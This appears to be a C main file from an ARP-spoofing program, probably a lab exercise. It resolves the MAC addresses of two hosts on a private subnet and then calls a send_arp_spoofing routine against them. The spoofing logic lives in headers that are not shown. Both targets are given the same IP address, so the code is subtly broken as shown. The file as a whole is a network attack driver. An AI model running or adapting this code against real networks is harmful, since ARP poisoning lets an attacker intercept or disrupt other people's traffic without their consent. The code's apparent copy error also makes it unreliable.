#include <stdio.h>
#include <sys/types.h> // for u_char
#include <arpa/inet.h> // for htons, inet_addr
#include "find_target_ethernet_address.h"
#include "find_ethernet_address.h"
#include "arp_spoofing.h"

int main(int argc, char**argv) {

	unsigned long own_ip_address = inet_addr("192.168.64.1");
	unsigned long target1_ip_address = inet_addr("192.168.64.2");
	unsigned long target2_ip_address = inet_addr("192.168.64.2");

	u_char *target1_ethernet_address = 
		get_target_ethernet_address("enp0s5", (u_char*)&own_ip_address, (u_char*)&target1_ip_address);

	printf("Target1 ethernet address [%02x:%02x:%02x:%02x:%02x:%02x]\n",
		target1_ethernet_address[0], target1_ethernet_address[1], target1_ethernet_address[2],
		target1_ethernet_address[3], target1_ethernet_address[4], target1_ethernet_address[5]);

	u_char *target2_ethernet_address = 
		get_target_ethernet_address("enp0s5", (u_char*)&own_ip_address, (u_char*)&target2_ip_address);

	printf("Target2 ethernet address [%02x:%02x:%02x:%02x:%02x:%02x]\n",
		target2_ethernet_address[0], target2_ethernet_address[1], target2_ethernet_address[2],
		target2_ethernet_address[3], target2_ethernet_address[4], target2_ethernet_address[5]);

	send_arp_spoofing("enp0s5", target1_ethernet_address, (u_char*)&target1_ip_address, target2_ethernet_address, (u_char*)&target2_ip_address);

	return 0;
}
